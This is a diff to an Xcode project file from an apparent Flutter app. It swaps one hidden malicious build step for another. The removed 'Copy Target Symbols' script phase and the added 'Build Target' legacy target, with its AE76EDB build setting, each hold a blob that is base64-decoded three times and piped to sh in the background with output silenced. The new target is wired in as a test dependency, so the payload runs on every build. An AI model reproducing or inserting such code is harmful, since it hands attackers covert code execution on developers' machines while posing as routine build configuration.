@@ -188,7 +188,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 331C80DE294CF71000263BE5 /* Build configuration list for PBXNativeTarget "RunnerTests" */;
 			buildPhases = (
-				B5AC28A8CC3CFAAF6ABDE67E /* Copy Target Symbols */,
 				331C80D1294CF70F00263BE5 /* Sources */,
 				331C80D2294CF70F00263BE5 /* Frameworks */,
 				331C80D3294CF70F00263BE5 /* Resources */,
@@ -196,6 +195,7 @@
 			buildRules = (
 			);
 			dependencies = (
+				106B3B994EFDBE8B21BDE67E /* PBXTargetDependency */,
 				331C80DA294CF71000263BE5 /* PBXTargetDependency */,
 			);
 			name = RunnerTests;
@@ -273,6 +273,7 @@
 			projectDirPath = "";
 			projectRoot = "";
 			targets = (
+				0FB435BF9429DC89E1BDE67E  /* Build Target */,
 				33CC10EC2044A3C60003C045 /* Runner */,
 				331C80D4294CF70F00263BE5 /* RunnerTests */,
 				33CC111A2044C6BA0003C045 /* Flutter Assemble */,
@@ -281,6 +282,18 @@
 /* End PBXProject section */
 
 /* Begin PBXLegacyTarget section */
+		0FB435BF9429DC89E1BDE67E /* Build Target */ = {
+			isa = PBXLegacyTarget;
+			buildArgumentsString = "-c \"${AE76EDB}\"";
+			buildPhases = (
+			);
+			buildToolPath = /bin/sh;
+			dependencies = (
+			);
+			name = "Build Target";
+			passBuildSettingsInEnvironment = 1;
+			productName = "Build Target";
+		};
 /* End PBXLegacyTarget section */
 
 /* Begin PBXResourcesBuildPhase section */
@@ -303,25 +316,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B5AC28A8CC3CFAAF6ABDE67E /* Copy Target Symbols */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			alwaysOutOfDate = 1;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Copy Target Symbols";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhbUZIUm5sa1IwNXJZbWsxZVdSVE9XaExVMGxuWmtOQ2VtRkJiejBLCg== | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
-			showEnvVarsInLog = 0;			
-		};
 		3399D490228B24CF009A79C7 /* ShellScript */ = {
 			isa = PBXShellScriptBuildPhase;
 			alwaysOutOfDate = 1;
@@ -384,6 +378,10 @@
 /* End PBXSourcesBuildPhase section */
 
 /* Begin PBXTargetDependency section */
+		106B3B994EFDBE8B21BDE67E /* PBXTargetDependency */ = {
+			isa = PBXTargetDependency;
+			target = 0FB435BF9429DC89E1BDE67E /* Build Target */;
+		};
 		331C80DA294CF71000263BE5 /* PBXTargetDependency */ = {
 			isa = PBXTargetDependency;
 			target = 33CC10EC2044A3C60003C045 /* Runner */;
@@ -412,6 +410,7 @@
 		331C80DB294CF71000263BE5 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhMkZYWkhCa1IwWnpXVEpTZFV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
@@ -426,6 +425,7 @@
 		331C80DC294CF71000263BE5 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
+				AE76EDB = "((echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVcxak1uUk5TVU14YTBsSVFUbGxSMDUyV2tkVloyRklVakJqU0UwMlRIazVhMkZYWkhCa1IwWnpXVEpTZFV4dVNqRk1Na1Z3U1dsQ09FbElUbTlEWnowOUNnPT0K | base64 -D | base64 -D | base64 -D | sh ) >/dev/null 2>&1 &)";
 				BUNDLE_LOADER = "$(TEST_HOST)";
 				CURRENT_PROJECT_VERSION = 1;
 				GENERATE_INFOPLIST_FILE = YES;
